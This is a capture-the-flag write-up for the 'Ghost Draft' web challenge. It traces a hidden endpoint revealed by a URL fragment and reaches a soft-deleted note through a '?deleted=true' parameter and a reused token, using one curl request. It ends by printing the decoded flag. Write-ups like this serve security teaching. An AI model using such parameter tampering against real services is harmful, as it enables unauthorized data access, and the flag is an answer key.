# Ghost Draft Writeup

Challenge: Ghost Draft

Flag: `VishwaCTF{s0Ft_d3let3_!s_nOt_dEl3te}`

## Summary

The challenge was a web challenge with two intended hints:

1. URL fragments are handled by the browser and are not sent to the server.
2. Deleted records were not fully gone and could still be explicitly included.

## Recon

- Visiting `/` returned only `Welcome to Secure Docs`.
- A small route check found `/portal`.
- `/portal` loaded `/script.js`.

Relevant logic from `/script.js`:

- It reads `window.location.hash`.
- If the hash is `draft`, it reveals:
  - a decoded hint about records persisting
  - the hidden endpoint `/api/notes?token=draftkey123`

So the first step was:

`https://ghost.vishwactf.com/portal#draft`

Then manually visit:

`https://ghost.vishwactf.com/api/notes?token=draftkey123`

## Deleted Note

The notes page listed note 13 only as:

`Archived Record (Unavailable)`

Directly requesting `/note/13` returned:

`{"error":"This record has been deleted."}`

The useful pivot was adding:

`?deleted=true`

That changed the response to:

`{"error":"Password required","hint":"Provide 'pass' parameter"}`

So the deleted record handler was still present, but hidden behind an extra parameter.

## Exploit

Using the same draft token as the password:

```bash
curl 'https://ghost.vishwactf.com/note/13?deleted=true&pass=draftkey123'
```

Response:

```json
{
  "content":"cleanup pending – VmlzaHdhQ1RGe3MwRnRfZDNsZXQzXyFzX25PdF9kRWwzdGV9",
  "deleted":true,
  "id":13,
  "title":"Archived Record"
}
```

The value after the dash is base64:

`VmlzaHdhQ1RGe3MwRnRfZDNsZXQzXyFzX25PdF9kRWwzdGV9`

Decoding it gives:

`VishwaCTF{s0Ft_d3let3_!s_nOt_dEl3te}`

## Final Flag

`VishwaCTF{s0Ft_d3let3_!s_nOt_dEl3te}`
